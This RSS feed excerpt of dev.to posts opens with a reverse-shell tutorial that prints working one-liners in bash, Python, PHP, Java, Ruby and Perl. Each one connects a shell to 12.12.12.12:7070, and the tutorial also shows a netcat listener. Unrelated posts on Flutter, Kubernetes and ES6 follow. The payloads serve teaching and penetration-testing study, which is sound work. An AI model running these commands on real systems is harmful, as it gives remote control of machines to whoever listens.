      <pubDate>Fri, 25 Jun 2021 20:24:24 +0000</pubDate>
      <link>https://dev.to/yumatsushima07/cybersecurity-how-do-reverse-shells-work-1jfc</link>
      <guid>https://dev.to/yumatsushima07/cybersecurity-how-do-reverse-shells-work-1jfc</guid>
      <description>&lt;h1&gt;
  &lt;a href="#reverse-shells"&gt;
  &lt;/a&gt;
  Reverse Shells
&lt;/h1&gt;

&lt;h2&gt;
  &lt;a href="#how-do-reverse-shells-work"&gt;
  &lt;/a&gt;
  How do reverse shells work?
&lt;/h2&gt;

&lt;p&gt;To make a connection to a typical remote shell, a machine controlled by the attacker connects to the remote network host and it requests a shell connection.&lt;br&gt;
This is called a &lt;code&gt;blind shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;But what if the remote host is not directly accessible, like it has public IP or is protected by a firewall?&lt;/p&gt;

&lt;p&gt;In this situation reverse shells maybe shouldn't be used, where the target machine initiates connection to the listening network host a shell is now established.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#reverse-shells-examples"&gt;
  &lt;/a&gt;
  Reverse Shells Examples
&lt;/h2&gt;

&lt;p&gt;To start you need a listener process on their system to listen the reverse shell connections incoming to their IP address, Eg, &lt;code&gt;12.12.12.12&lt;/code&gt;&lt;br&gt;
On Linux, this can be as simple as one netcat command.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nc -lvnp 7070
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;The netcat listener will listen at port &lt;code&gt;7070&lt;/code&gt;. An attacker needs to execute the code to the listener. Many reverse shells needs programming langs&lt;br&gt;
and systems. &lt;br&gt;
Check out &lt;a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentestmonkey’s Reverse Shell Cheat Sheet&lt;/a&gt; for more.&lt;br&gt;
Codes are typically one-liners to allow injection using a single command. &lt;br&gt;
While the examples below are for Linux and other Unix-like systems, many of them will also work on Windows if you change the command line interpreter call from &lt;code&gt;/bin/sh -i&lt;/code&gt; to &lt;code&gt;cmd.exe&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#bash-reverse-shell"&gt;
  &lt;/a&gt;
  Bash Reverse Shell
&lt;/h3&gt;

&lt;p&gt;If the target machine runs Linux, it’s a good idea to start with bash, as nearly all Linux systems come with this system shell:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;/bin/bash &lt;span class="nt"&gt;-i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/12.12.12.12/7070 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#python-reverse-shell"&gt;
  &lt;/a&gt;
  Python Reverse Shell
&lt;/h3&gt;

&lt;p&gt;With Python continuing to gain popularity, there’s a good chance it’s available on the target server and can be used to execute a script like:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("12.12.12.12",7070));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#php-reverse-shell"&gt;
  &lt;/a&gt;
  PHP Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Most web servers will have PHP installed, and this too can provide a reverse shell vector (if the file descriptor &amp;amp;3 doesn’t work, you can try subsequent numbers):&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="n"&gt;php&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="s1"&gt;'$sock=fsockopen("12.12.12.12",7070);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#java-reverse-shell"&gt;
  &lt;/a&gt;
  Java Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Java is likely to be available on application servers:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;([&lt;/span&gt;&lt;span class="s"&gt;"/bin/bash"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"-c"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"exec 5&amp;lt;&amp;gt;/dev/tcp/12.12.12.12/7070;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done"&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;waitFor&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#ruby-reverse-shell"&gt;
  &lt;/a&gt;
  Ruby Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Ruby is another popular web application language that’s likely to have an interpreter on a general-purpose server system:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("12.12.12.12",7070).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#perl-reverse-shell"&gt;
  &lt;/a&gt;
  Perl Reverse Shell
&lt;/h3&gt;

&lt;p&gt;As with bash, a perl interpreter should be available on most Linux servers, so a perl command might be another way to obtain a reverse shell:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight perl"&gt;&lt;code&gt;&lt;span class="nv"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;e&lt;/span&gt; &lt;span class="p"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;use Socket;$i="12.12.12.12";$p=7070;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h2&gt;
  &lt;a href="#check-out-my-gist-here"&gt;
  &lt;/a&gt;
  Check out my Gist Here
&lt;/h2&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#credits"&gt;
  &lt;/a&gt;
  Credits
&lt;/h2&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt; / &lt;a href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Readme file
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
      &lt;h1&gt;
Welcome to Yuma-Tsushima's Github page!&lt;/h1&gt;
  &lt;p&gt;
  &lt;b&gt;Visitor count &lt;/b&gt;&lt;br&gt;
  &lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;img src="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.patreon.com/Order_of_the_Black_Knights_C2_bot" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/6a6769e2d2eb0567975317a589549beaa5db99df73ce9d6f5f9004ec12eee28e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f537570706f72742d42757925323075732532306125323050697a7a612d6f72616e67652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d70617472656f6e" alt="Support"&gt;&lt;/a&gt;
&lt;a href="https://disboard.org/server/711260885531885648" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/018986f113096a2680c8fa03f313cdf0b8adf24be6d7b9df04b81f14e7897680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f43322773253230506c6163652d4a6f696e2532307573253230666f7225323061253230636861742d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b3b2ffae6fa2d5de61341af99a4e69ce1546047acebcb5039aa106a8411b2209/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a6f696e253230746f253230636861742d4379626572417274427974652d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b8ae02d15a55c4261d919a7dd81f80335cf71d017eb6b737cc32698877f322f9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f536f756e642d436c6f75642d7265642e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d736f756e64636c6f7564" alt="SoundCloud"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/blob/main/assets/terminalpython.png"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--30kNr2f4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/raw/main/assets/terminalpython.png"&gt;&lt;/a&gt;&lt;/p&gt;

      &lt;h3&gt;
About Myself&lt;/h3&gt;
      &lt;p&gt;Hello, my name is Yuma-Tsushima (frequently shortened to Yuma). I am an ambitious coder, and I enjoy coding in JavaScript (mainly). I also love making websites using HTML, CSS and (of course) JS! I started programming (self taught) at the age of 13. Originally, I came from the creative field ; I draw/sing/animate/make music.  &lt;/p&gt;
   

&lt;h3&gt;
Talents and Hobbies&lt;/h3&gt;
&lt;p&gt;I love drawing (I have been drawing all of my life). I play strategy games, I code and I do CTFs! I am also good at animation, making AMVs and image editing. My favourite game is Mindustry, followed by Flow Free and Sudoku. I love watching anime (I love Code Geass - I relate to Lelouch a lot) and I aspire to create my own anime!&lt;/p&gt;
&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a"&gt;&lt;img src="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a" alt="Drawing"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042"&gt;&lt;img src="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042" alt="Music"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025" alt="Digital Artwork"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041" alt="ICT"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041" alt="Electronics"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525"&gt;&lt;img src="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525" alt="Desgins"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025" alt="Web dev"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525"&gt;&lt;img src="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525" alt="Strategy"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt; Check out my work!: &lt;/b&gt; &lt;br&gt;
❯ Soundcloud : &lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;0c7av3h4ck5&lt;/a&gt; &lt;br&gt;
❯ Discord : &lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;{CyberArtByte}&lt;/a&gt;  &lt;br&gt;
❯ Artwork : &lt;a href="https://medibang.com/u/AcceleratorArts07/" rel="nofollow"&gt;AcceleratorArts07&lt;/a&gt; &lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Recent Medium&lt;/b&gt;…&lt;/p&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;


&lt;h3&gt;
  &lt;a href="#follow-me"&gt;
  &lt;/a&gt;
  Follow me!
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Github: &lt;a href="https://github.com/Yuma-Tsushima07"&gt;https://github.com/Yuma-Tsushima07&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Medium: &lt;a href="https://0xv37r1x3r.medium.com/"&gt;https://0xv37r1x3r.medium.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;SoundCloud: &lt;a href="https://soundcloud.com/0c7av3h4ck5"&gt;https://soundcloud.com/0c7av3h4ck5&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#discord-servers"&gt;
  &lt;/a&gt;
  Discord Servers!!
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Bounty Hunters&lt;/strong&gt;: An amazing bug hunting community full of developers and exploiters!!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.gg/J5PsgKqdWq"&gt;https://discord.gg/J5PsgKqdWq&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;CyberArtByte&lt;/strong&gt;: My server full of bling and joy!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.com/invite/mNAWykv67W"&gt;https://discord.com/invite/mNAWykv67W&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#new-soundcloud-track"&gt;
  &lt;/a&gt;
  New Soundcloud Track!!
&lt;/h3&gt;

&lt;p&gt;&lt;iframe width="100%" height="166" src="https://w.soundcloud.com/player/?url=https://soundcloud.com/0c7av3h4ck5/hack-with-your-heart-0c7av3h4ck5&amp;amp;auto_play=false&amp;amp;color=%23000000&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&amp;amp;show_teaser=true"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Author: Yuma-Tsushima07&lt;/p&gt;

</description>
      <category>security</category>
      <category>programming</category>
      <category>python</category>
      <category>java</category>
    </item>
    <item>
      <title>Best Youtube Channels to learn Flutter [2021]</title>
      <author>Anonymous Programmer</author>
      <pubDate>Fri, 25 Jun 2021 20:16:00 +0000</pubDate>
      <link>https://dev.to/anonymousprogrammer/best-youtube-channels-to-learn-flutter-2021-48bd</link>
      <guid>https://dev.to/anonymousprogrammer/best-youtube-channels-to-learn-flutter-2021-48bd</guid>
      <description>&lt;p&gt;Hey What's Up?&lt;br&gt;
In this article we are gonna talk about best Youtube Channels to learn Flutter. Obviously We would be starting from flutter's official youtube channel, &lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;FLUTTER &lt;/li&gt;
&lt;li&gt;RetroPortal Studio&lt;/li&gt;
&lt;li&gt;MTECH Viral&lt;/li&gt;
&lt;li&gt;TVAC Studio&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I know I missed many out, So please share in the comments, But Personally these are the only channels I learn nd implement flutter from...&lt;/p&gt;

&lt;p&gt;Bye See you in the other one!&lt;/p&gt;

</description>
      <category>flutter</category>
      <category>fluttter2021</category>
      <category>bestyoutubechannel</category>
      <category>learning</category>
    </item>
    <item>
      <title>Why is learning Kubernetes so Intimidating?</title>
      <author>Austin King (he/him)</author>
      <pubDate>Fri, 25 Jun 2021 20:14:37 +0000</pubDate>
      <link>https://dev.to/opsdrill/why-is-learning-kubernetes-so-intimidating-1hco</link>
      <guid>https://dev.to/opsdrill/why-is-learning-kubernetes-so-intimidating-1hco</guid>
      <description>&lt;p&gt;During customer interviews, while I was building OpsDrill, I was shocked by something. Very talented DevOps folks were having a hard time learning Kubernetes.&lt;/p&gt;

&lt;p&gt;“I’ve been dragging my feet on learning”&lt;/p&gt;

&lt;p&gt;“I’ve started and given up 3 times”&lt;/p&gt;

&lt;p&gt;“I don’t know where to start, afraid it will mess up my laptop”&lt;/p&gt;

&lt;p&gt;“It’s overwhelming”&lt;/p&gt;

&lt;p&gt;I was relieved to hear this as I also found it intimidating.&lt;/p&gt;

&lt;p&gt;There is a lot of great free tutorials out there, but some of it feels like jumping straight into “Kubernetes 301: PhD in Containerology”.&lt;/p&gt;

&lt;p&gt;(&lt;a href="https://github.com/kelseyhightower/kubernetes-the-hard-way"&gt;Kubernetes the Hard Way&lt;/a&gt; I’m looking at you. An amazing resource, but a very steep on-ramp for busy DevOps folks.)&lt;/p&gt;

&lt;p&gt;In the past I’ve built games for learning as well as spaced repetition apps for helping to memorize materials. Would you be interested in&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;An adventure game&lt;/li&gt;
&lt;li&gt;Played 15 minutes a day&lt;/li&gt;
&lt;li&gt;Using real Kubernetes commands&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;To really, finally, learn Kubernetes?&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--urg3yddG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y0catm5ugb65qfo85iic.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--urg3yddG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y0catm5ugb65qfo85iic.jpg" alt="Pirates of the Kubernetes mockup of a game played with real kubernetes commands"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#pirates-of-the-kubernetes-waitlist-for-early-access"&gt;
  &lt;/a&gt;
  Pirates of the Kubernetes waitlist for early access
&lt;/h3&gt;

&lt;p&gt;Join at &lt;a href="https://piratesofthekubernetes.com"&gt;https://piratesofthekubernetes.com&lt;/a&gt;&lt;/p&gt;

</description>
      <category>kubernetes</category>
      <category>devops</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Getting started with ECMAScript6</title>
      <author>Christopher Glikpo</author>
      <pubDate>Fri, 25 Jun 2021 19:48:38 +0000</pubDate>
      <link>https://dev.to/cglikpo/getting-started-with-ecmascript6-d0i</link>
      <guid>https://dev.to/cglikpo/getting-started-with-ecmascript6-d0i</guid>
      <description>&lt;h2&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h2&gt;

&lt;p&gt;ECMAScript6  is also known as ECMAScript2015.ES6 is a significant upgrade to ES5 and adds a slew of new capabilities to JavaScript.&lt;/p&gt;

&lt;p&gt;In this article, we'll walk through how to set things up to develop ES6 applications and get started with some of the most important new features.&lt;/p&gt;

&lt;p&gt;This article covers:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Browser support&lt;/li&gt;
&lt;li&gt;Setting up Babel and webpack&lt;/li&gt;
&lt;li&gt;Code editors&lt;/li&gt;
&lt;li&gt;Modules&lt;/li&gt;
&lt;li&gt;const and let&lt;/li&gt;
&lt;li&gt;Classes&lt;/li&gt;
&lt;li&gt;Object literal syntax&lt;/li&gt;
&lt;li&gt;Destructuring assignment&lt;/li&gt;
&lt;li&gt;Arrow functions&lt;/li&gt;
&lt;li&gt;Template strings&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#browser-support"&gt;
  &lt;/a&gt;
  Browser support
&lt;/h2&gt;

&lt;p&gt;The setup necessary for building ES6 apps is determined by the amount of cross-platform compatibility you wish to give. Most of ES6 is already supported by the latest versions of Chrome, Firefox, Edge, and Node.js, so if you're just targeting these newer runtimes, you can start using it right now.For further details about which runtimes support which features, you can consult the &lt;a href="http://kangax.github.io/compat-table/es6/"&gt;ES6 compatibility table.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can run the following code in your browser's JavaScript console. If your browser supports ES6, it should evaluate to &lt;code&gt;3&lt;/code&gt;. If not, it will complain about a syntax error.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let [two, three] = [2, 3];
two + three;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Unfortunately, the general browser market may be out of date, meaning that many users are still not using an ES6-compatible browser. If you're developing a public-facing online application, you should continue to assist these individuals.&lt;/p&gt;

&lt;p&gt;Fortunately, there's a project called &lt;a href="https://babeljs.io/"&gt;Babel&lt;/a&gt; which allows you to convert your ES6 code into ES5 code. This means that you can still write code in ES6 while developing web applications that anybody with an ES5-compliant browser can use. It takes some effort to figure out how to set everything up the first time, so I've included a step-by-step guide below to help you get started more quickly.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setting-up-babel-and-webpack"&gt;
  &lt;/a&gt;
  Setting up Babel and webpack
&lt;/h2&gt;

&lt;p&gt;If you do not already have Node.js installed, you will need to &lt;a href="https://nodejs.org/en/"&gt;install it&lt;/a&gt;.&lt;/p&gt;

